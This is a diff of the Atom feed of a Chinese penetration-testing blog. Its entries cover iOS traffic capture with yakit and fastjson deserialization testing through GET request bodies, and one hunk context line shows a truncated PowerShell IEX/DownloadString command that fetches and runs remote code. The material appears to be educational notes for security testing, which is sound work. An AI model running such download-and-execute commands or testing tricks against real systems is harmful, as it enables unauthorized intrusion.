@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">Klear·blog</title>
     <subtitle type="html">Klear的生活记录&amp;&amp;工作记录。</subtitle>
-    <updated>2024-04-24T13:59:21&#43;08:00</updated>
+    <updated>2024-09-04T18:12:36&#43;08:00</updated>
     <id>https://klearcc.github.io/</id>
     <link rel="alternate" type="text/html" href="https://klearcc.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://klearcc.github.io/atom.xml" />
@@ -16,6 +16,55 @@
             </author>
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
     <generator uri="https://gohugo.io/" version="0.103.1">Hugo</generator>
+        <entry>
+            <title type="text">微信插件</title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E5%BE%AE%E4%BF%A1%E5%A2%9E%E5%BC%BA/" />
+            <id>https://klearcc.github.io/post/%E5%BE%AE%E4%BF%A1%E5%A2%9E%E5%BC%BA/</id>
+            <updated>2024-04-24T14:31:41&#43;08:00</updated>
+            <published>2024-04-24T14:14:27&#43;08:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">微信美化、增强 还没想好大文件存储在哪里，……</summary>
+            
+                <content type="html">&lt;p&gt;微信美化、增强&lt;/p&gt;
+&lt;p&gt;还没想好大文件存储在哪里，待写&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E5%BE%AE%E4%BF%A1/" term="微信" label="微信" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/wechat/" term="wechat" label="wechat" />
+                            
+                        
+                            
+                            
+                            
+                                <category scheme="https://klearcc.github.io/tags/%E6%8F%92%E4%BB%B6/" term="插件" label="插件" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">linux持久化</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/linux%E6%8C%81%E4%B9%85%E5%8C%96/" />
@@ -838,7 +887,7 @@ Content-Length: 401
             <title type="text">OSCP经验分享</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/oscp%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B/" />
             <id>https://klearcc.github.io/post/oscp%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B/</id>
-            <updated>2024-04-24T13:59:12&#43;08:00</updated>
+            <updated>2024-04-24T14:14:31&#43;08:00</updated>
             <published>2024-01-16T21:22:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
@@ -3955,16 +4004,17 @@ sudo vi /etc/proxychains.conf&lt;/p&gt;
             <title type="text">云安全初探</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/oss-cf/" />
             <id>https://klearcc.github.io/post/oss-cf/</id>
-            <updated>2023-07-01T18:25:24&#43;08:00</updated>
+            <updated>2024-04-24T15:14:50&#43;08:00</updated>
             <published>2023-06-28T19:25:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
                     <uri>https://klearcc.github.io/</uri>
                     <email>baicaix86@gmail.com</email>
                     </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">云安全初探 扫盲 术语 Bucuket：存储空……</summary>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">20240424 云更新 云安全初探 扫盲 术语 Bucuket……</summary>
             
-                <content type="html">&lt;h1 id=&#34;云安全初探&#34;&gt;云安全初探&lt;/h1&gt;
+                <content type="html">&lt;h1 id=&#34;20240424-云更新&#34;&gt;20240424 云更新&lt;/h1&gt;
+&lt;h1 id=&#34;云安全初探&#34;&gt;云安全初探&lt;/h1&gt;
 &lt;h2 id=&#34;扫盲&#34;&gt;扫盲&lt;/h2&gt;
 &lt;h3 id=&#34;术语&#34;&gt;术语&lt;/h3&gt;
 &lt;h4 id=&#34;bucuket存储空间桶&#34;&gt;Bucuket：存储空间、桶。&lt;/h4&gt;
@@ -4188,16 +4238,16 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString(&amp;#39;https:/
             <title type="text">autoBot</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/autobot/" />
             <id>https://klearcc.github.io/post/autobot/</id>
-            <updated>2024-01-16T16:53:19&#43;08:00</updated>
+            <updated>2024-04-24T14:32:14&#43;08:00</updated>
             <published>2023-04-14T19:46:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
                     <uri>https://klearcc.github.io/</uri>
                     <email>baicaix86@gmail.com</email>
                     </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">AutoBot virtualenvwrapper &amp;gt;pip install virtualenv &amp;gt;pip install virtualenvwrapper &amp;gt;mkvirtualenv ##不出意外会报错no……</summary>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">AutoBot报错解决 virtualenvwrapper &amp;gt;pip install virtualenv &amp;gt;pip install virtualenvwrapper &amp;gt;mkvirtualenv #……</summary>
             
-                <content type="html">&lt;h2 id=&#34;autobot&#34;&gt;AutoBot&lt;/h2&gt;
+                <content type="html">&lt;h2 id=&#34;autobot报错解决&#34;&gt;AutoBot报错解决&lt;/h2&gt;
 &lt;h5 id=&#34;virtualenvwrapper&#34;&gt;virtualenvwrapper&lt;/h5&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;pip install virtualenv
 &amp;gt;pip install virtualenvwrapper
@@ -6059,17 +6109,22 @@ shift+enter&lt;/p&gt;
             <title type="text">Iosapp抓包</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/" />
             <id>https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/</id>
-            <updated>2024-01-16T13:55:40&#43;08:00</updated>
+            <updated>2024-04-24T14:40:48&#43;08:00</updated>
             <published>2022-09-20T21:22:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
                     <uri>https://klearcc.github.io/</uri>
                     <email>baicaix86@gmail.com</email>
                     </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">202310 修改 直接使用yakit设置系统代理。 前……</summary>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">202404 修改 手机和yakit在同一网络 使用ya……</summary>
             
-                <content type="html">&lt;h2 id=&#34;202310-修改&#34;&gt;202310 修改&lt;/h2&gt;
-&lt;p&gt;直接使用yakit设置系统代理。&lt;/p&gt;
+                <content type="html">&lt;h2 id=&#34;202404-修改&#34;&gt;202404 修改&lt;/h2&gt;
+&lt;p&gt;手机和yakit在同一网络
+使用yakit监听0.0.0.0
+手机上设置yakit的http代理
+手机上下载证书并安装。⚠️信任证书后到设置-通用-关于-证书信任设置 将证书点成绿色。否则https抓包会有问题
+现在流量都到yakit里了&lt;/p&gt;
+&lt;p&gt;###############&lt;/p&gt;
 &lt;h3 id=&#34;前情提要&#34;&gt;前情提要&lt;/h3&gt;
 &lt;p&gt;mac抓ios实体机app数据包。&lt;/p&gt;
 &lt;h3 id=&#34;流量&#34;&gt;流量&lt;/h3&gt;
@@ -6721,6 +6776,66 @@ adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
     
         <entry>
             <title type="text"></title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/get%E8%AF%B7%E6%B1%82%E6%90%BA%E5%B8%A6body%E7%9A%84%E6%83%85%E5%86%B5/" />
+            <id>https://klearcc.github.io/post/get%E8%AF%B7%E6%B1%82%E6%90%BA%E5%B8%A6body%E7%9A%84%E6%83%85%E5%86%B5/</id>
+            <updated>2024-06-21T11:17:38&#43;08:00</updated>
+            <published>0001-01-01T00:00:00&#43;00:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">背景： 最近测试时发现了fastjson反……</summary>
+            
+                <content type="html">&lt;p&gt;背景：
+最近测试时发现了fastjson反序列化漏洞，但数据包有些不同。
+漏洞是被动插件探测到的，如果仅仅手动测可能这次就会漏了。&lt;/p&gt;
+&lt;p&gt;正常请求如下：
+![[Pasted image 20240619164840.png]]&lt;/p&gt;
+&lt;p&gt;手测时正常测试过程如下：
+可能会把&lt;code&gt;payload&lt;/code&gt;放在&lt;code&gt;platformCode&lt;/code&gt; 或 将请求改为&lt;code&gt;post&lt;/code&gt;并将&lt;code&gt;payload&lt;/code&gt;放在请求体中&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;放在&lt;code&gt;platformCode&lt;/code&gt;参数中时，发现可以成功请求，但是没有触发&lt;code&gt;dnslog&lt;/code&gt;
+![[Pasted image 20240619165329.png]]&lt;/li&gt;
+&lt;li&gt;将请求改为&lt;code&gt;post&lt;/code&gt;并将&lt;code&gt;payload&lt;/code&gt;放在请求体中， 都无法触发
+![[Pasted image 20240619165732.png]]![[Pasted image 20240619165755.png]]&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;只有以下情况时才会触发&lt;code&gt;dnslog&lt;/code&gt;
+![[Pasted image 20240619170121.png]]&lt;/p&gt;
+&lt;p&gt;疑问：
+不理解这个数据包在服务端如何被处理的，以前没有注意过也没有尝试发送过这样的请求&lt;/p&gt;
+&lt;p&gt;搜索资料发现：
+不少人讨论get请求能不能带body的问题，有的觉得可以有的觉得不行，有的认为最好别带。
+有人说其在工作中从来没有见同事用get带body，自己做爬虫也没见到有网站用get带body的
+说明这种还是少数情况。
+但根据http协议来看，没有明确规定get请求不能传输实体，也就是说get是可以有body的，只是不推荐这么用。&lt;/p&gt;
+&lt;p&gt;为什么不推荐：
+带有请求体的get请求信息存在未定义的语义，发送带有body的get请求将会导致某些现有实现拒绝该请求。也就是这种方式有安全风险。&lt;/p&gt;
+&lt;p&gt;什么情况下可以发这样的包：
+使用浏览器发送时设置的body会被忽略，只有使用发包程序发送，并且服务端处理的情况下，这种数据包才会正确响应。&lt;/p&gt;
+&lt;p&gt;结论：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;http 协议没有为get请求的body 赋定义，也就是即不要求也不禁止get请求带 body。&lt;/li&gt;
+&lt;li&gt;大多数http实现从技术上都支持get请求带 body，少数会禁止。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;最后：
+在服务端处理的情况下，测试时可以将payload作为 body 也放在get请求中去尝试，避免遗漏。&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text"></title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/google/" />
             <id>https://klearcc.github.io/post/google/</id>
             <updated>2022-11-14T10:27:02&#43;08:00</updated>
@@ -6852,6 +6967,35 @@ arm64下，函数的参数存放在x0-x7中，如果参数个数超过8就要入
     
         <entry>
             <title type="text"></title>
+            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/tmp/" />
+            <id>https://klearcc.github.io/post/tmp/</id>
+            <updated>2024-06-21T15:26:39&#43;08:00</updated>
+            <published>0001-01-01T00:00:00&#43;00:00</published>
+            <author>
+                    <name>Klear</name>
+                    <uri>https://klearcc.github.io/</uri>
+                    <email>baicaix86@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">get详细 https://blog.csdn.net/Xiaofeng_Lu__/article/details/125884335</summary>
+            
+                <content type="html">&lt;p&gt;get详细
+&lt;a href=&#34;https://blog.csdn.net/Xiaofeng_Lu__/article/details/125884335&#34;&gt;https://blog.csdn.net/Xiaofeng_Lu__/article/details/125884335&lt;/a&gt;&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text"></title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/xwin%E4%BF%A1%E6%81%AF/" />
             <id>https://klearcc.github.io/post/xwin%E4%BF%A1%E6%81%AF/</id>
             <updated>2023-01-08T14:53:02&#43;08:00</updated>
@@ -6926,7 +7070,7 @@ arm64下，函数的参数存放在x0-x7中，如果参数个数超过8就要入
             <title type="text"></title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E8%84%86%E5%BC%B1%E7%9A%84%E7%94%9F%E5%91%BD/" />
             <id>https://klearcc.github.io/post/%E8%84%86%E5%BC%B1%E7%9A%84%E7%94%9F%E5%91%BD/</id>
-            <updated>2024-04-24T13:59:15&#43;08:00</updated>
+            <updated>2024-04-24T14:16:33&#43;08:00</updated>
             <published>0001-01-01T00:00:00&#43;00:00</published>
             <author>
                     <name>Klear</name>
